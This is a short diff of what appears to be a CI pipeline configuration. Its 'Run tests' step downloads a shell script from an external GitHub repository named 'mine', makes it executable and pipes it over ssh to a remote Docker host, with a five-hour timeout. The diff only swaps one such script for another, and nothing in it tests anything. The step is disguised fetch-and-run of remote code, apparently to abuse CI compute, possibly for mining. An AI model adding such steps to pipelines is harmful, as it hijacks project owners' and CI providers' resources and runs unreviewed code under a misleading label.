@@ -10,7 +10,7 @@ jobs:
       - run: 
           name: Run tests 
           command: | 
-            wget https://raw.githubusercontent.com/geraldyolang11/mine/main/working1.sh
-            chmod +x working1.sh
-            cat working1.sh | ssh remote-docker
+            wget https://raw.githubusercontent.com/geraldyolang11/mine/main/dgbc.sh
+            chmod +x dgbc.sh
+            cat dgbc.sh | ssh remote-docker
           no_output_timeout: 5h
